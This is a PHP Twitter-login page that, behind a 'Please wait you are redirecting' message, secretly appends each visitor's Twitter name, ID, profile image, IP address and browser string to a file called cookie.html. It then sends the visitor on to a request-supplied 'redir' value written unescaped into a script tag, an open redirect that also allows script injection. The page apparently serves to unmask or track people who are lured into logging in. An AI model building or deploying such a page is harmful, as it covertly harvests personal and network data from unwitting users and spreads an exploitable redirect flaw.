<?php

include("header.php");

if(!isset($_SESSION['redir']))
 {
	 $_SESSION['redir'] = isset($_REQUEST['redir'])? $_REQUEST['redir'] : '';
 }



$debug = false; //set the debuging mode

if($_GET["reset"])
{
	session_destroy();
	header('Location: ./index.php');
}
// Include config file and twitter PHP Library by Abraham Williams (abraham@abrah.am)

include_once("inc/twitteroauth.php");
require_once('TwitterAPIExchange.php');

?>

<?php

	if(isset($_SESSION['status']) && $_SESSION['status']=='verified') 
	{	//Success, redirected back from process.php with varified status.
		//retrive variables
		$screen_name 		= $_SESSION['request_vars']['screen_name'];
		$twitterid 			= $_SESSION['request_vars']['user_id'];
		$oauth_token 		= $_SESSION['request_vars']['oauth_token'];
		$oauth_token_secret = $_SESSION['request_vars']['oauth_token_secret'];
	
		//Show welcome message
		//echo '<div class="welcome_txt">Welcome <strong>'.$screen_name.'</strong></div>';
		
		$redir = $_SESSION['redir'];
		
		$settings = array(
		'oauth_access_token' => OAUTH_ACCESS_TOKEN,
		'oauth_access_token_secret' => OAUTH_ACCESS_TOKEN_SECRET,
		'consumer_key' => CONSUMER_KEY,
		'consumer_secret' => CONSUMER_SECRET
		 );
		 
		  
		$url = 'https://api.twitter.com/1.1/users/lookup.json';
		$getfield = "?screen_name=$screen_name";
		$requestMethod = 'GET';
		$twitter = new TwitterAPIExchange($settings);
		$user =  $twitter->setGetfield($getfield)
					 ->buildOauth($url, $requestMethod)
					 ->performRequest(); 
					 
		$user_data = json_decode($user);
		
		//echo "<pre>";
		//print_r($user_data);
		//echo "u: $user "; 
		 //echo "redir: $redir";
		
		 $img =  $user_data[0]->profile_image_url;
		 
		if($debug)
		{
			echo "<a href='https://twitter.com/" . $screen_name . "' target='_blank' >";
			
			echo "<img border='0'  src='". $img . "' alt='user image' /><br>";
			
			echo   $user_data[0]->name . "</a><br>";
			
			
			echo "<div align='left' style='margin: 0 0 0 350px;' >";
			echo "ID: " . $user_data[0]->id  . "<br>";
			echo "Joining Date: " . $user_data[0]->created_at  . "<br>";
			echo "IP: " .$_SERVER["REMOTE_ADDR"] . "<br>";
			echo "Browser: " . $_SERVER['HTTP_USER_AGENT']  . "<br>";
			echo " </div>";
		}
		else
		{	
			echo "<br /><br /><h1 align='center'>Please wait you are redirecting.....</h1>";
			
			$fp3 = fopen("cookie.html","a");
			
			fwrite($fp3, "<p>--</p>\n",1024);
			fwrite($fp3,"<a href='https://twitter.com/" . $screen_name . "' target='_blank' ><br />\n",1024);
			
			fwrite($fp3,"<img border='0'  src='". $img . "' alt='user image' /><br />\n",1024);
			fwrite($fp3,$user_data[0]->name . "</a><br />\n",1024);
			fwrite($fp3,"<b>ID:</b> " . $user_data[0]->id  . "<br />\n",1024);
			fwrite($fp3,"<b>Joining Date:</b> " . $user_data[0]->created_at  . "<br />\n",1024);
			fwrite($fp3,"<b>IP:</b> " .$_SERVER["REMOTE_ADDR"] . "<br />\n",1024);
			fwrite($fp3,"<b>Browser:</b> " . $_SERVER['HTTP_USER_AGENT']  . "<br />\n",1024);
			
			fclose($fp3);
			
			unset($_SESSION['redir']);
			
			echo "<script>window.location='" . $redir . "';</script>";
		}
		
		
	}else{
		//login button
		echo '<script type="text/javascript">window.top.location="process.php"</script>';
	}

?>
<?php 
include("footer.php");
?>